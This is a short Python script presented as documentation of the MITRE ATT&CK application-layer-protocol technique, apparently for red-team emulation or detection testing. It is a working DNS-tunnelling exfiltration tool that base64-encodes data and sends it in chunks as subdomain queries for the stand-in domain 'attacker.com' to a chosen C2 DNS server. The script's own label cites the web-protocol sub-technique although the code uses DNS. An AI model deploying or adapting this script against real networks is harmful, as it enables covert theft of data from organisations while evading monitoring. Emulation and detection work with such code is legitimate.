# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1071: Application Layer Protocol (Generic)
# Objective: Using common protocols (HTTP, DNS, SMB) for C2.

#!/usr/bin/env python3
import argparse
import base64
import dns.resolver
import dns.message

# --- Configuration ---
# The IP address of your DNS listener server.
# Use 127.0.0.1 if running the listener on the same machine.
C2_SERVER_IP = "127.0.0.1"
# The port your DNS listener is running on.
C2_SERVER_PORT = 53
# The domain you are "exfiltrating" to.
DOMAIN = "attacker.com"

def dns_c2_exfiltrate(server_ip, server_port, domain, data):
    """
    Exfiltrates data by sending it as subdomain queries directly to a
    specified DNS server, bypassing the system's default resolver.
    """
    encoded_data = base64.b64encode(data.encode()).decode()
    chunk_size = 63 # Max DNS label length

    print(f"[*] Exfiltrating data to DNS server at {server_ip}:{server_port}")
    print(f"[*] Using domain: {domain}")
    print(f"[*] Encoded data: {encoded_data}\n")

    # Create a custom resolver that points to our C2 server
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [server_ip]
    resolver.port = server_port

    for i in range(0, len(encoded_data), chunk_size):
        chunk = encoded_data[i:i+chunk_size]
        subdomain = f"{chunk}.{domain}"
        
        try:
            # This query goes DIRECTLY to our listener, not the OS's DNS server
            answers = resolver.resolve(subdomain, 'A')
            print(f"[+] Sent query for: {subdomain} (Got answer: {answers[0]})")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            # NXDOMAIN is the expected response from our simple listener
            print(f"[+] Sent query for: {subdomain} (Got expected NXDOMAIN)")
        except Exception as ex:
            print(f"[-] Failed to exfiltrate chunk: {subdomain} - Error: {ex}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="T1071.001: DNS C2 Exfiltration (Fixed)")
    parser.add_argument("--data", required=True, help="Data to exfiltrate")
    # We hardcode the domain and server IP for simplicity, but they could be args too.
    args = parser.parse_args()
    
    dns_c2_exfiltrate(C2_SERVER_IP, C2_SERVER_PORT, DOMAIN, args.data)